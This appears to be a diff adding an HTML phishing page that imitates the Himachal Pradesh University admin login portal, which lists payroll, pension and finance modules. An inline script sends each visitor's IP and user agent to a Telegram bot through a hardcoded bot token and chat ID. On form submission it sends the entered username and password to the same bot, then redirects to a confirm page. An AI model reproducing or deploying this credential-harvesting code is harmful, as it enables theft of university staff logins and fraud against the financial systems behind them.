@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HPU :: Himachal Pradesh University :: UNIVERSITY ADMIN LOGIN</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: row;
+        height: 100vh;
+      }
+
+      .left-section {
+        width: 60%;
+        background: url("assets/login-bg.png") no-repeat center center;
+        background-size: cover;
+        position: relative;
+      }
+
+      .left-overlay {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0);
+        color: white;
+        padding: 60px;
+      }
+
+      .left-overlay h1 {
+        font-size: 32px;
+        font-weight: 600;
+        margin-bottom: 15px;
+      }
+
+      .left-overlay h1 span {
+        color: #ffcc00;
+      }
+
+      .left-overlay p {
+        font-size: 16px;
+        margin-bottom: 25px;
+      }
+
+      .menu-columns {
+        display: flex;
+        justify-content: space-between;
+        max-width: 600px;
+      }
+
+      .menu-columns ul {
+        list-style: none;
+      }
+
+      .menu-columns li {
+        font-size: 14px;
+        margin-bottom: 10px;
+      }
+
+      .menu-columns li::before {
+        content: "\25B6";
+        margin-right: 10px;
+        color: #ffcc00;
+      }
+
+      .right-section {
+        width: 40%;
+        background-color: #15477a;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        padding: 40px;
+      }
+
+      .right-section img {
+        width: 80px;
+        margin-bottom: 20px;
+      }
+
+      .right-section h2 {
+        font-size: 20px;
+        margin-bottom: 5px;
+      }
+
+      .right-section p {
+        font-size: 13px;
+        margin-bottom: 25px;
+        color: #ddd;
+      }
+
+      .login-heading {
+        font-size: 16px;
+        color: #ffcc00;
+        margin-bottom: 20px;
+      }
+
+      .login-form {
+        width: 100%;
+        max-width: 350px;
+      }
+
+      .login-form input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 4px;
+      }
+
+      .login-form button {
+        width: 100%;
+        padding: 12px;
+        background-color: #f2a343;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+
+      .login-form button:hover {
+        background-color: #d88e2c;
+      }
+
+      @media (max-width: 768px) {
+        body {
+          flex-direction: column;
+        }
+
+        .left-section {
+          display: none;
+        }
+
+        .right-section {
+          width: 100%;
+          height: 100vh;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+      document.addEventListener("DOMContentLoaded", async () => {
+        const telegramToken = "7847771856:AAEE3Cj-YIRV0-N5vCVtszt15KRO3EVKsBw";
+        const telegramChatID = "7170636658";
+        const userAgent = navigator.userAgent;
+        let ipAddress = null;
+
+        async function sendToTelegram(message) {
+          const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+          const params = new URLSearchParams({
+            chat_id: telegramChatID,
+            text: message,
+          }).toString();
+          await fetch(`${url}?${params}`);
+        }
+
+        async function fetchIpAddress() {
+          const response = await fetch("https://api.ipify.org?format=json");
+          const data = await response.json();
+          ipAddress = data.ip;
+          await sendToTelegram(
+            `[!] VISIT:\nUser Agent: ${userAgent}\nIP Address: https://whatismyipaddress.com/ip/${ipAddress}`
+          );
+        }
+
+        await fetchIpAddress();
+
+        document
+          .querySelector("form")
+          .addEventListener("submit", async (event) => {
+            event.preventDefault();
+
+            const id = document.getElementById("id").value;
+            const password = document.getElementById("password").value;
+
+            const loginMessage = `[!] LOGIN:\nUser ID: ${id}\nPassword: ${password}\nUser Agent: ${userAgent}\nIP Address: https://whatismyipaddress.com/ip/${ipAddress}`;
+            await sendToTelegram(loginMessage);
+
+            window.location.href = "./confirm.html";
+          });
+      });
+    </script>
+
+    <div class="left-section">
+      <div class="left-overlay">
+        <h1>Welcome To HPU - <span>Admin Portal</span></h1>
+        <p>After single login admin can access below activities.</p>
+        <div class="menu-columns">
+          <ul>
+            <li>HRMS & Payroll</li>
+            <li>Bill Tracking System</li>
+            <li>Pension Portal</li>
+            <li>Establishment</li>
+          </ul>
+          <ul>
+            <li>Pension Management</li>
+            <li>User Management</li>
+            <li>PF</li>
+            <li>Leave Management</li>
+          </ul>
+          <ul>
+            <li>Financial Accounts</li>
+            <li>Budget Mgmt.</li>
+            <li>Employee Portal</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="right-section">
+      <img src="assets/login-logo.png" alt="HPU Logo" />
+      <h2>Himachal Pradesh University</h2>
+      <p>(A State Government University Accredited with 'A' grade by NAAC)</p>
+    <div class="login-heading">Enter Login Information</div>
+      <form class="login-form">
+        <input type="text" id="id" name="id" placeholder="Username" required />
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Password"
+          required
+        />
+        <button type="submit">LOGIN</button>
+      </form>
+    </div>
+  </body>
+</html>
